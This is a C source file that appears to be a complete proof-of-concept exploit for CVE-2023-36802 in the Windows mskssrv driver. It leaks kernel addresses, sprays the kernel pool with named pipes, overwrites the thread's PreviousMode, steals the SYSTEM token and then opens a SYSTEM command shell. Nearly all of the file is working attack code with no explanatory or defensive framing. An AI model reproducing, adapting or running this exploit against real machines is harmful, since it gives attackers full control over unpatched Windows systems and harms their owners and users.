#include "file_info.h"

#define IOCTL_FS_INIT_CONTEXT	0x2F0400
#define IOCTL_PUBLISH_RX		0x2F040C

#define SPRAY_SIZE 20000

HANDLE hEvent;
ULONG_PTR mskssrv_file_obj;
ULONG_PTR cur_eprocess;
ULONG_PTR cur_token;
ULONG_PTR system_eprocess;
ULONG_PTR system_token;
ULONG_PTR main_kthread;
ULONG_PTR main_prevmode;
HANDLE hMskssrv;
NtWriteVirtualMemoryFunc NtWriteVirtualMemory;
NtReadVirtualMemoryFunc NtReadVirtualMemory;
HANDLE hProc;
HANDLE hMainThread;
HANDLE cReg;
HANDLE hSystem;

typedef struct fake_stream_ {
	ULONG_PTR data[0x3b];
}fake_stream;

void thread_main()
{
	printf("\t[+] Main Thread Start and Wait for Previous mode overwritten to 0\n");
	char leak_prevmode = 1;
	ULONG_PTR junk = 0;
	NTSTATUS status = -1;
	while (!main_prevmode) {
		;
	}
	ULONG_PTR system_token_val = 0;
	while (status != STATUS_SUCCESS) {
		status = NtReadVirtualMemory(hProc, system_token, &system_token_val, 8, &junk);
	}
	printf("\t\t[+] Overwrite PrevMode Success\n");
	NtWriteVirtualMemory(hProc, cur_token, &system_token_val, 8, &junk);
	printf("\t\t[+] OverWrite Current token to system token done, value: %p\n", system_token_val);
	ULONG_PTR context2 = 0;
	NtReadVirtualMemory(hProc, mskssrv_file_obj + 0x20, &context2, 8, &junk);
	printf("\t\t[+] FsContextReg Object addr: %p\n", context2);
	ULONG_PTR ProcessBilled = 0;
	NtReadVirtualMemory(hProc, context2 + 0x1a8, &ProcessBilled, 8, &junk);
	printf("\t\t[+] ProcessBilled Value: %p\n", ProcessBilled);
	ULONG_PTR null_ = 0;
	NtWriteVirtualMemory(hProc, context2 + 0x1a8, &null_, 8, &junk);
	printf("\t\t[+] Overwrite ProcessBilled field to zero done\n");
	NtWriteVirtualMemory(hProc, context2 + 0x198, &null_, 8, &junk);
	printf("\t\t[+] Overwrite FsContextReg object+0x188 to zero to break loop\n");
	WaitForSingleObject(hEvent, INFINITE);

	printf("\t\t[+] Restore Start..\n");
	NtWriteVirtualMemory(hProc, context2 + 0x1a8, &ProcessBilled, 8, &junk);
	printf("\t\t\t[+] Restore ProcessBilled field done\n");
	ULONG_PTR object_header = cur_eprocess - 0x30;
	ULONG_PTR PointerCount = 0;
	printf("\t\t\t[+] Current EPROCESS's OBJECT_HEADER address: %p\n", object_header);
	NtReadVirtualMemory(hProc, object_header, &PointerCount, 8, &junk);
	printf("\t\t\t[+] Ref Count: 0x%p\n", PointerCount);
	PointerCount++;
	NtWriteVirtualMemory(hProc, object_header, &PointerCount, 8, &junk);
	printf("\t\t\t[+] Increment of current EPROCESS object done\n");
	NtWriteVirtualMemory(hProc, main_prevmode, &leak_prevmode, 1, &junk);
	printf("\t\t\t[+] Reset PreviousMode to 1 done\n");
}

void thread_sep()
{
	printf("\t[+] Loop Thread Start..\n");
	ULONG_PTR InBuf[0x20] = { 0 };
	InBuf[4] = 0x100000001;
	DeviceIoControl(cReg, IOCTL_PUBLISH_RX, InBuf, 0x100, NULL, 0, NULL, NULL);
	printf("\t\t[+] Loop thread loop finished..\n");
	SetEvent(hEvent);
}

int main(int argc, char** argv)
{
	printf("[+] Start CVE-2023-36802 Exploit..\n");
	HMODULE hNtDll = GetModuleHandleW(L"ntdll.dll");
	if (!hNtDll) {
		printf("\t[-] Failed to get ntdll handle.\n");
		return -1;
	}

	NtFsControlFileFunc NtFsControlFile = (NtFsControlFileFunc)GetProcAddress(hNtDll, "NtFsControlFile");
	NtReadVirtualMemory = (NtReadVirtualMemoryFunc)GetProcAddress(hNtDll, "NtReadVirtualMemory");
	NtWriteVirtualMemory = (NtWriteVirtualMemoryFunc)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
	if (!NtFsControlFile || !NtReadVirtualMemory || !NtWriteVirtualMemory) {
		printf("\t[-] Failed to get Nt function address.\n");
		return -1;
	}

	// Open mskssrv device
	hMskssrv = CreateFileA("\\\\?\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_NEW,
		0,
		NULL);

	// Leak required kernel address
	ULONG len = sizeof(SYSTEM_HANDLE_INFORMATION_EX);
	PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
	handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(len);
	if (!handleInfo) {
		printf("\t[-] Memory allocation failed\n");
		return -1;
	}

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());
	DWORD main_threadId;
	hMainThread = CreateThread(NULL, 0, thread_main, NULL, 0, &main_threadId);
	
	cReg = CreateFileA("\\\\?\\ROOT#SYSTEM#0000#{3c0d501a-140b-11d1-b40f-00a0c9223196}\\{96E080C7-143C-11D1-B40F-00A0C9223196}&{3C0D501A-140B-11D1-B40F-00A0C9223196}",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_NEW,
		0,
		NULL);

	NTSTATUS status = NtQuerySystemInformation(64, handleInfo, len, &len);	// SystemExtendedHandleInformation
	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		free(handleInfo);
		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(len);

		if (!handleInfo) {
			printf("\t[-] Memory allocation failed\n");
			return -1;
		}

		status = NtQuerySystemInformation(64, handleInfo, len, &len);
	}
	if (!NT_SUCCESS(status)) {
		printf("\t[-] NtQuerySystemInformation failed\n");
		free(handleInfo);
		return -1;
	}

	for (ULONG_PTR i = 0;i < handleInfo->NumberOfHandles; i++) {
		if (handleInfo->Handles[i].HandleValue == cReg &&
			handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) {
			mskssrv_file_obj = (ULONG_PTR)handleInfo->Handles[i].Object;
			printf("\t[+] mskssrv FILE_OBJECT address: %p\n", mskssrv_file_obj);
		}
		if (handleInfo->Handles[i].HandleValue == hProc &&
			handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId()) {
			cur_eprocess = (ULONG_PTR)handleInfo->Handles[i].Object;
			printf("\t[+] Current EPROCESS address: %p\n", cur_eprocess);
			cur_token = cur_eprocess + 0x4b8;
		}
		if (handleInfo->Handles[i].UniqueProcessId == 4 &&
			handleInfo->Handles[i].HandleValue == 4) {
			system_eprocess = (ULONG_PTR)handleInfo->Handles[i].Object;
			printf("\t[+] System EPROCESS address: %p\n", system_eprocess);
			system_token = system_eprocess + 0x4b8;
		}
		if (handleInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() &&
			handleInfo->Handles[i].HandleValue == hMainThread) {
			main_kthread = (ULONG_PTR)handleInfo->Handles[i].Object;
			printf("\t[+] main thread KTHREAD address: %p\n", main_kthread);
			main_prevmode = main_kthread + 0x232;
		}
	}

	// Spraying pool
	DWORD spray_size = SPRAY_SIZE;
	PHANDLE hPipeArray = malloc(sizeof(HANDLE) * spray_size);
	PHANDLE hFileArray = malloc(sizeof(HANDLE) * spray_size);
	IO_STATUS_BLOCK isb;

	

	fake_stream fs1 = { 0 };
	fake_stream fs2 = { 0 };
	fake_stream fs3 = { 0 };
	fs1.data[0] = &fs2;
	fs1.data[0x1a] = 0x1;
	fs2.data[0] = &fs3;
	fs3.data[0] = &fs2;

	ULONG_PTR Inbuf[0x20] = { 0 };
	Inbuf[3] = main_prevmode + 0x30;
	Inbuf[0xd] = &fs1;
	Inbuf[0xf] = &fs2;
	
	NTSTATUS s;
	HANDLE tmp[SPRAY_SIZE] = { 0 };
	for (int i = 0;i < spray_size;i++) {
		hPipeArray[i] = CreateNamedPipeW(L"\\\\.\\pipe\\ex", PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x30, 0x30, 0, 0);

		tmp[i] = CreateFile(L"\\\\.\\pipe\\ex", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);

		s = NtFsControlFile(hPipeArray[i], 0, 0, 0, &isb, 0x119ff8, Inbuf, 0x80, 0, 0); //NpInternalWrite
		if (!NT_SUCCESS(s)) {
			printf("\t[-] pool spraying failed, %p\n", s);
			return -1;
		}
	}

	//Create Holes
	for (int i = spray_size-0x20;i < spray_size;i += 4)
	{
		CloseHandle(tmp[i]);		// create hole
		CloseHandle(hPipeArray[i]);
	}

	ULONG_PTR InitBuf[0x20] = { 0 };
	InitBuf[0] = 0xdeadbeef;			// &1 != 0
	InitBuf[1] = 0xdeadbeef1;			// non-zero value
	InitBuf[2] = 0xdeadbeef2;			// non-zero value
										// InitBuf[3] = 0
	
	// Put FsContextReg in Hole
	DeviceIoControl(cReg, IOCTL_FS_INIT_CONTEXT, InitBuf, 0x100, NULL, 0, NULL, NULL);

	DWORD sep_threadId;
	HANDLE hSepThread = CreateThread(NULL, 0, thread_sep, NULL, 0, &sep_threadId);

	WaitForSingleObject(hMainThread, INFINITE);
	WaitForSingleObject(hSepThread, INFINITE);

	for (int i = 0;i < spray_size;i++) {
		if (tmp[i]) CloseHandle(tmp[i]);
		if (hPipeArray[i]) CloseHandle(hPipeArray[i]);
	}
	CloseHandle(hMainThread);
	CloseHandle(hSepThread);
	CloseHandle(hEvent);

	system("cmd.exe");

    return 0;
}
